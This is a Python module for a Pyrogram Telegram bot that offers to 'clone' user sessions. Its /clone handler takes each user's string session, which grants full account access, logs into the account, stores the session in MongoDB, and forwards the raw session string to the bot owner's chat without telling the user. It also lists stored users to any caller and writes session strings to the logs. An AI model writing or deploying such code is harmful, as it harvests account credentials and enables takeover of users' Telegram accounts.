import logging
import asyncio
from pyrogram import Client, filters
from BADUC.core.clients import *
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
from BADUC.core.config import API_HASH, API_ID, OWNER_ID
from BADUC import save_idclonebot_owner
from BADUC import mongodb

IDCLONES = set()
idclonebotdb = mongodb.idclonebotdb


@bot.on_message(filters.command(["clone"]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        string_session = message.text.split("/clone", 1)[1].strip()
        mi = await message.reply_text("**Checking your String Session...**")
        try:
            app = Client(
                name="ClonedSession",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=string_session,
                no_updates=True,
            )
            await app.start()
            user = await app.get_me()
            clone_id = user.id
            username = user.username or user.first_name
            await save_idclonebot_owner(clone_id, message.from_user.id)
            
            details = {
                "user_id": user.id,
                "username": username,
                "name": user.first_name,
                "session": string_session,
            }

            cloned_bots = idclonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)

            await client.send_message(
                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
            )

            await idclonebotdb.insert_one(details)
            IDCLONES.add(user.id)

            await mi.edit_text(
                f"**Session for @{username} successfully cloned ✅.**\n"
                f"**Remove clone by:** /delidclone\n**Check all cloned sessions by:** /idcloned"
            )
        except AccessTokenInvalid:
            await mi.edit_text("**Invalid String Session. Please provide a valid one.**")
        except Exception as e:
            logging.exception("Error during cloning process.")
            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.**\n\n**Error:** `{e}`")
    else:
        await message.reply_text("**Provide a Pyrogram String Session after the /clone **\n\n**Example:** `/clone string session paste here`\n\n**Get a Pyrogram string session from here:** [Click Here](https://telegram.tools/session-string-generator#pyrogram,user)")

@bot.on_message(filters.command("idcloned"))
async def list_cloned_sessions(client, message):
    try:
        cloned_bots = idclonebotdb.find()
        cloned_bots_list = await cloned_bots.to_list(length=None)
        if not cloned_bots_list:
            await message.reply_text("**No sessions have been cloned yet.**")
            return

        total_clones = len(cloned_bots_list)
        text = f"**Total Cloned Sessions:** {total_clones}\n\n"
        for bot in cloned_bots_list:
            text += f"**User ID:** `{bot['user_id']}`\n"
            text += f"**Name:** {bot['name']}\n"
            text += f"**Username:** @{bot['username']}\n\n"

        await message.reply_text(text)
    except Exception as e:
        logging.exception(e)
        await message.reply_text("**An error occurred while listing cloned sessions.**")

@bot.on_message(filters.command("delidclone"))
async def delete_cloned_session(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text("**⚠️ Please provide the string session after the command.**\n\n**Example:** `/delidclone your string session here`")
            return

        string_session = " ".join(message.command[1:])
        ok = await message.reply_text("**Checking the session string...**")

        cloned_session = await idclonebotdb.find_one({"session": string_session})
        if cloned_session:
            await idclonebotdb.delete_one({"session": string_session})
            IDCLONES.remove(cloned_session["user_id"])

            await ok.edit_text(
                f"**Your String Session has been removed from my database ✅.**\n\n**Your bot will stop after a restart.**"
            )
        else:
            await message.reply_text("**⚠️ The provided session is not in the cloned list.**")
    except Exception as e:
        await message.reply_text(f"**An error occurred while deleting the cloned session:** {e}")
        logging.exception(e)

@bot.on_message(filters.command("delallidclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_sessions(client, message):
    try:
        a = await message.reply_text("**Deleting all cloned sessions...**")
        await idclonebotdb.delete_many({})
        IDCLONES.clear()
        await a.edit_text("**All cloned sessions have been deleted successfully ✅**")
    except Exception as e:
        await a.edit_text(f"**An error occurred while deleting all cloned sessions:** {e}")
        logging.exception(e)

async def restart_idchatbots():
    global IDCLONES
    try:
        logging.info("Restarting all cloned sessions...")
        sessions = [session async for session in idclonebotdb.find()]
        
        async def restart_session(session):
            string_session = session["session"]
            app = Client(
                name="ClonedSession",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=string_session,
                no_updates=True,
            )
            try:
                await app.start()
                user = await app.get_me()
                
                if user.id not in IDCLONES:
                    IDCLONES.add(user.id)

                logging.info(f"Successfully restarted session for: @{user.username or user.first_name}")
            except Exception as e:
                logging.exception(f"Error while restarting session: {string_session}. Removing invalid session.")
                await idclonebotdb.delete_one({"session": string_session})

        await asyncio.gather(*(restart_session(session) for session in sessions))
        logging.info("All sessions restarted successfully.")
    except Exception as e:
        logging.exception("Error while restarting sessions.")
